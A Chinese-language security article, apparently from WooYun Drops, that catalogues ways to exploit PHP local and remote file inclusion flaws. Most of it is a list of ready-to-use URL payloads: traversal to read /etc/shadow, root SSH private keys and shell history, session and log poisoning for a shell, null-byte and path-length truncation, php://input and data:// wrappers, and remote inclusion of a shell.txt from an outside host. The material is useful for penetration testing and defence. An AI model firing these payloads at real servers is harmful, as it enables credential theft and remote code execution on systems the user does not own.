# PHP文件包含漏洞总结

0x00 前言
-------

* * *

PHP文件包含漏洞的产生原因是在通过PHP的函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。最常见的就属于本地文件包含（Local File Inclusion）漏洞了。

我们来看下面一段index.php代码:

```
if ($_GET['func']) {
   include $_GET['func'];
} else {
   include 'default.php';
}

```

程序的本意可能是当提交url为http://example.com/index.php?func=add.php时，调用add.php里面的样式内容和功能。直接访问http://example.com/index.php则会包含默认的default.php

那么问题来了，如果我们提交http://example.com/index.php?func=upload/pic/evil.jpg ，且evil.jpg是由黑客上传到服务器上的一个图片，在图片的末尾添加了恶意的php代码，那么恶意的代码就会被引入当前文件执行。

[![](http://static.wooyun.org/20141112/2014111204023183499.png)](http://drops.wooyun.org/wp-content/uploads/2014/11/file0001.png)

如果被包含的文件中无有效的php代码，则会直接把文件内容输出。

在接下来的内容中会以代码样本作为例子，来给大家介绍各种奇葩猥琐的利用姿势。

0x01 普通本地文件包含
-------------

* * *

```
<?php include("inc/" . $_GET['file']); ?>

```

*   包含同目录下的文件：  
    ?file=.htaccess
    
*   目录遍历：
    

?file=../../../../../../../../../var/lib/locate.db ?file=../../../../../../../../../var/lib/mlocate/mlocate.db

（linux中这两个文件储存着所有文件的路径，需要root权限）

*   包含错误日志： ?file=../../../../../../../../../var/log/apache/error.log （试试把UA设置为“”来使payload进入日志）
    
*   获取web目录或者其他配置文件：
    

?file=../../../../../../../../../usr/local/apache2/conf/httpd.conf

（更多→http://wiki.apache.org/httpd/DistrosDefaultLayout）

*   包含上传的附件：

?file=../attachment/media/xxx.file

*   读取session文件：

?file=../../../../../../tmp/sess_tnrdo9ub2tsdurntv0pdir1no7

（session文件一般在/tmp目录下，格式为sess_[your phpsessid value]，有时候也有可能在/var/lib/php5之类的，在此之前建议先读取配置文件。在某些特定的情况下如果你能够控制session的值，也许你能够获得一个shell）

*   如果拥有root权限还可以试试读这些东西：

/root/.ssh/authorized_keys

/root/.ssh/id_rsa

/root/.ssh/id_rsa.keystore

/root/.ssh/id_rsa.pub

/root/.ssh/known_hosts

/etc/shadow

/root/.bash_history

/root/.mysql_history

/proc/self/fd/fd[0-9]* (文件标识符)

/proc/mounts

/proc/config.gz

*   如果有phpinfo可以包含临时文件：

参见http://hi.baidu.com/mmnwzsdvpkjovwr/item/3f7ceb39965145eea984284el

0x02 有限制的本地文件包含
---------------

* * *

```
<?php include("inc/" . $_GET['file'] . ".htm"); ?> 

```

*   %00截断：

?file=../../../../../../../../../etc/passwd%00

(需要 magic_quotes_gpc=off，PHP小于5.3.4有效)

*   %00截断目录遍历：

?file=../../../../../../../../../var/www/%00

(需要 magic_quotes_gpc=off，unix文件系统，比如FreeBSD，OpenBSD，NetBSD，Solaris)

*   路径长度截断：

?file=../../../../../../../../../etc/passwd/././././././.[…]/./././././.

(php版本小于5.2.8(?)可以成功，linux需要文件名长于4096，windows需要长于256)

*   点号截断：

?file=../../../../../../../../../boot.ini/………[…]…………

(php版本小于5.2.8(?)可以成功，只适用windows，点号需要长于256)

0x03 普通远程文件包含
-------------

* * *

```
<?php include($_GET['file']); ?>

```

*   远程代码执行：

?file=[http|https|ftp]://example.com/shell.txt

(需要allow_url_fopen=On并且 allow_url_include=On)

*   利用php流input：

?file=php://input

(需要allow_url_include=On，详细→http://php.net/manual/en/wrappers.php.php)

*   利用php流filter：

?file=php://filter/convert.base64-encode/resource=index.php

(同上)

*   利用data URIs：

?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=

(需要allow_url_include=On)

*   利用XSS执行任意代码：

?file=http://127.0.0.1/path/xss.php?xss=phpcode

(需要allow_url_fopen=On，allow_url_include=On并且防火墙或者白名单不允许访问外网时，先在同站点找一个XSS漏洞，包含这个页面，就可以注入恶意代码了。条件非常极端和特殊- -)

0x04 有限制的远程文件包含
---------------

* * *

```
<?php include($_GET['file'] . ".htm"); ?> 

```

*   ?file=http://example.com/shell
    
*   ?file=http://example.com/shell.txt?
    
*   ?file=http://example.com/shell.txt%23
    

(需要allow_url_fopen=On并且allow_url_include=On)

*   ?file=\evilshare\shell.php (只需要allow_url_include=On)

0x05 延伸
-------

* * *

其实在前面也说了，这些漏洞产生原因是PHP函数在引入文件时，传入的文件名没有经过合理的校验，从而操作了预想之外的文件。实际上我们操作文件的函数不只是include()一个，上面提到的一些截断的方法同样可以适用于以下函数：

[![](http://static.wooyun.org/20141112/2014111204023129613.png)](http://drops.wooyun.org/wp-content/uploads/2014/11/file0002.png)

参考文章:

http://websec.wordpress.com/2009/11/28/freebsd-directory-listing-with-php-file-functions/

http://www.digininja.org/blog/when_all_you_can_do_is_read.php

http://wiki.apache.org/httpd/DistrosDefaultLayout

http://ddxhunter.wordpress.com/2010/03/10/lfis-exploitation-techniques/

http://www.coresec.org/2011/05/12/local-file-inclusion-to-remote-command-execution-using-ssh/

http://www.ush.it/2009/02/08/php-filesystem-attack-vectors/

http://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/

http://diablohorn.wordpress.com/2010/01/16/interesting-local-file-inclusion-method/